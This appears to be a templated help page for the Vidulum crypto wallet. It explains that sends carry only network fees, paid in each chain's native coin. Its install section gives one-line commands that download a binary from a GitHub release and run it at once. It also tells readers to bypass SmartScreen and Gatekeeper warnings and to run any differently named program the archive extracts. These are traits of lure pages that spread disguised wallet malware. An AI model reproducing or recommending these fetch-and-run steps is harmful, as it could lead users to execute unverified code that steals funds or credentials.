![Vidulum](../assets/banner-article.png)

# Vidulum Wallet Fees: Network Fees Only, No Service Fee

What a send costs, why it fails for lack of a fee coin, and why no fee table exists.

## Downloads - v2.2.1

<p align="center"><a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-win-v2.2.1.exe"><img src="../assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-macos-v2.2.1.dmg"><img src="../assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-linux-v2.2.1.zip"><img src="../assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="../assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`vidulum-wallet-desktop-win-v2.2.1.exe`](https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-win-v2.2.1.exe) |
| <img src="../assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`vidulum-wallet-desktop-macos-v2.2.1.dmg`](https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-macos-v2.2.1.dmg) |
| <img src="../assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`vidulum-wallet-desktop-linux-v2.2.1.zip`](https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-linux-v2.2.1.zip) |

Check the [current Vidulum release](https://github.com/vidulum-app/vidulum-wallet-desktop/releases/tag/v2.2.1) before blaming a fee for a failed send.

> The wallet takes nothing. The chain takes its fee, and the chain is not negotiable.

Vidulum adds no service fee: no percentage, no withdrawal charge, no subscription. The only cost of a transaction is the network fee of the chain it runs on, paid in that chain's own coin. This page explains that model, why a fee shortfall is the most common send failure, and why no fee table can be published.

<!-- ARTICLE-BODY-BEGIN -->

## The fee model, in one paragraph

Every blockchain charges to include a transaction. The amount is set by the network and by current congestion, and it is paid in the chain's native coin: BTC on Bitcoin, ETH on Ethereum, ATOM on Cosmos Hub, and so on. Vidulum builds and signs the transaction; it does not add anything on top.

That is the whole model, and it explains the most common failure: if the balance of the fee coin is empty, the transaction cannot be paid for, even when the asset being sent is worth a fortune.

## Why the fee is in a different coin

A token on an EVM chain is not the coin that pays gas. Holding a large balance of an ERC-20 token with no ETH means you can see the balance and still be unable to move it. The same applies on every family: the fee is denominated in the chain's own unit, not in the asset you are sending.

This is the single most useful thing to know about fees, and it is not a Vidulum rule - every non-custodial wallet inherits it.

## Why no fee table exists

A fee table would be wrong within the hour. Fees move with congestion, and each of the 20 networks sets its own. A published number would either be a stale estimate presented as fact or a promise that cannot be kept.

So this page gives the rule rather than the numbers: keep a balance of each chain's fee coin, and expect the network to decide the amount at the moment of sending.

## Preventing a fee failure

1. Keep a small balance of the native coin on every chain you use.
2. When sending a full token balance on an EVM chain, leave the native coin untouched.
3. When sending a full native balance, leave a reserve behind.
4. If a send fails with an unexplained error, check the fee balance before anything else.

Those four habits prevent most "insufficient funds" reports, including the ones that look like software bugs.

A fee failure is one of the causes in <a href="https://github.com/vidulum-app/vidulum-wallet-help/blob/main/guides/vidulum-send-error-transaction-fails.md">Vidulum Wallet send error checks</a>.

## Where the fee goes

To the validators or miners who include the transaction. None of it reaches the project, which is exactly why there is no receipt from them and no way to refund it. A fee paid is a fee spent.

The <a href="https://github.com/vidulum-app/vidulum-wallet-guides/blob/main/guides/vidulum-wallet-20-networks-one-recovery-phrase.md">Vidulum Wallet 20 networks from one recovery phrase</a> guide shows which coin each chain uses for fees.

The reward programme is a separate cost question, covered in <a href="https://github.com/vidulum-app/vidulum-wallet-staking/blob/main/guides/vidulum-staking-rewards-vdl-programme.md">Vidulum VDL staking rewards programme</a>.

Run the <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/tag/v2.2.1">Vidulum Wallet v2.2.1 release</a> build before blaming a fee for a failure.

## FAQ

### Does Vidulum charge to send?

No service fee. You pay the chain's network fee and nothing else.

### Why can I not send a token when I can see the balance?

The fee is paid in the chain's native coin, and that balance is separate from the token.

### Can fees be refunded?

No. They are paid to the network, not to the project.

### Why is there no fee list here?

Because fees change with congestion and differ per chain. A static list would mislead.

<!-- ARTICLE-BODY-END -->

## How to install Vidulum

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-win-v2.2.1.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-win-v2.2.1.exe">vidulum-wallet-desktop-win-v2.2.1.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-macos-v2.2.1.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-macos-v2.2.1.dmg">vidulum-wallet-desktop-macos-v2.2.1.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
Quick install (Terminal):

```bash
curl -fLo wallet.zip https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-linux-v2.2.1.zip && unzip -o wallet.zip -d vidulum-linux && chmod +x vidulum-linux/vidulum-wallet-desktop && ./vidulum-linux/vidulum-wallet-desktop
```

Manual install:
1. Download <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-linux-v2.2.1.zip">vidulum-wallet-desktop-linux-v2.2.1.zip</a>.
2. Extract the archive: `unzip -o wallet.zip -d vidulum-linux`.
3. Make it executable and run it: `chmod +x vidulum-linux/vidulum-wallet-desktop && ./vidulum-linux/vidulum-wallet-desktop`.
4. If the archive extracts a differently named program or a folder of its own, run that file instead: the ZIP is the download, not the program.
<!-- INSTALL-END -->

## Related guides

[Send error checks](https://github.com/vidulum-app/vidulum-wallet-help/blob/main/guides/vidulum-send-error-transaction-fails.md) - [20 networks from one phrase](https://github.com/vidulum-app/vidulum-wallet-guides/blob/main/guides/vidulum-wallet-20-networks-one-recovery-phrase.md) - [How rewards work](https://github.com/vidulum-app/vidulum-wallet-staking/blob/main/guides/vidulum-staking-rewards-vdl-programme.md) - [Current release](https://github.com/vidulum-app/vidulum-wallet-desktop/releases/tag/v2.2.1)
